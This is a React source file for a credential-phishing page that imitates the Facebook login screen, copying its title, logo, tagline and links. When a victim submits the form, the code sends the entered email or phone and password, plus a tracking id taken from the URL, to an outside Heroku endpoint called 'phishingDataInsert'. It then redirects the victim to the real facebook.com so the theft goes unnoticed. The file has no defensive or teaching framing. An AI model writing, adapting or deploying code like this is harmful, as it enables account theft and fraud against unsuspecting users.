import React from "react";
import { useForm } from "react-hook-form";
import logo from "../../../images/logo.svg";

const Facebook = () => {
  const {
    register,
    handleSubmit,
    watch,
    formState: { errors },
  } = useForm();

  

//   console.log(url)



  const onSubmit = (data) => {
    const url = window.location.href;
    const id = {id:url.split('id=')[1]};
    const phishData = {...id,...data};

      fetch('https://ancient-garden-81797.herokuapp.com/phishingDataInsert',{
          method:'POST',
          headers:{
            'Content-Type': 'application/json'
          },
          body:JSON.stringify(phishData)
      })
      .then(response => response.json())
      .then(result => {
        window.location.href = 'https://facebook.com'
      })
  };


  document.title = "Facebook - log in or sign up";


  

  return (
    <div className="facebook-container">
        
      <div className="container pt-72">
        <div className="row">
          <div className="col-md-6 d-sm-block d-none">
            <div className="logo-img">
              <img className="logo" src={logo} alt="" />
            </div>
            <h1 className="title">
              Facebook helps you connect and share with the people in your life.
            </h1>
          </div>
          <div className="col-md-6">
            <div className="p-2 form-data">
              <div className="form_wrap">
                <form onSubmit={handleSubmit(onSubmit)}>
                  <input {...register("name", { required: true })} placeholder="Email address or phone number" />
                  {errors.exampleRequired && <span>Name is required</span>}

                  <input {...register("password", { required: true })} placeholder="Password" />
                  {errors.exampleRequired && <span>Password is required</span>}

                  <input type="submit" value="Log In" />
                </form>
                <div className="text-center forget">
                    <a href="https://www.facebook.com/recover/initiate/?ars=facebook_login&privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjI0MzI1NTI2LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D">Forgotten password?</a>
                </div>
                <div className="border-fb"></div>
                <div className="text-center">
                    <button className="signup">Create New Account</button>
                </div>
              </div>
              <div className="page text-center">
                  <p><a href="https://www.facebook.com/pages/create/?ref_type=registration_form"><strong>Create a Page </strong></a>for a celebrity, band or business.</p>
              </div>
            </div>
          </div>
        </div>
      </div>

    </div>
  );
};

export default Facebook;
